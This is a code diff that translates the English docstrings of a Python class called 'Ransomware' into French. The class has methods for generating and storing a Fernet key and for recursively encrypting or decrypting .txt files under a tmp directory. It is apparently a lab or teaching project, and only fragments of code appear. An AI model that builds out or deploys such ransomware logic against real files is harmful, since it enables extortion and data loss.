@@ -24,7 +24,7 @@ class Ransomware:
 
     def generate_key(self):
         """
-        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
+        Génération d'une clé AES 128 pour chiffrer les fichiers. Utilisation des objets Fernet.
         """
 
         self.key = Fernet.generate_key()
@@ -33,10 +33,9 @@ class Ransomware:
     
     def read_key(self, keyfile_name):
         """
-        Reads in a key from a file.
+        Lis la clé contenue dans le fichier placé en argument
 
-        Args:
-            keyfile_name:str: Path to the file containing the key
+        Args: keyfile_name Chemin jusqu'à l'emplacement de la clé de secrète.
         """
 
         with open(keyfile_name, 'rb') as f:
@@ -46,7 +45,7 @@ class Ransomware:
 
     def write_key(self, keyfile_name):
         """
-        Writes the key to a keyfile
+        Ecrit la clé créée dans un fichier
         """
 
         print(self.key)
@@ -56,7 +55,7 @@ class Ransomware:
 
     def crypt_tmp(self, tmp_dir, encrypted=False):
         """
-        Recursively encrypts or decrypts files from tmp directory with allowed file extensions
+        Chiffre ou déchiffre récursivement les fichier de /tmp avec les extensions autorisées (ici .txt)
 
         Args:
             tmp_dir:str: Absolute path of top level directory
